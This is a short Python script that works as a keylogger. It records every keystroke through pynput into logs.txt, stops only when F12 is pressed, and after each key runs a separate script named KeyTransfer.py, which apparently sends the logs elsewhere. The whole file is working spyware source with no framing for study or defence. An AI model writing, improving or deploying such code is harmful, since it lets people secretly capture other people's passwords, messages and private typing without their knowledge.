from pynput.keyboard import Listener
import os
import socket
import subprocess
import platform


def anonymous(key):
        key = str(key)
        key = key.replace("'","")
        if key == "Key.f12":
                os.system(exit())
        with open("logs.txt", "a") as file:
                file.write(key)
                my_os = platform.system()
        if my_os == "Linux":
               	os.system("python3 KeyTransfer.py")
        else:
                subprocess.Popen('cmd /c "KeyTransfer.py"')
        print(key)
with Listener(on_press=anonymous) as listener:
        listener.join()